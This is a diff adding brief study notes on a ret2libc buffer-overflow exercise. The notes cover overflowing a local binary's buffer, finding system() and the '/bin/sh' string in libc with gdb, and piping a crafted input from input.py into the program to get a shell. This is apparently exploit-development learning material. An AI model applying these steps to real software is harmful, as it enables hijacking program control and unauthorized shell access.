@@ -1,0 +1,21 @@
+Run the program, overflow the buffer with a load of letters
+Find the address of system() (has to be found while the program is running)
+Then using an input.py file, create and pack the bufferoverflow
+python input.py > inFile
+then in gdb run < inFile to use that input
+
+Now we still crash due to missing "/bin/sh" args
+Info proc mappings to find libc
+find 0xAddress_of_lib_C, +9999999, "/bin/sh"
+0xf7f5f10b
+examine the address x/s 0xf7f5f10b
+edit our input to add the bin sh argument address
+
+This when running as before crashes, not because we failed
+but due the the shell is instantly closing
+Running with this: (python input.py; cat) | ./ret2lib.o
+Gives us shell access!
+
+Elegant Exiting:
+p exit to get address of exit
+Once found this can be used to replace the padding between system and the args
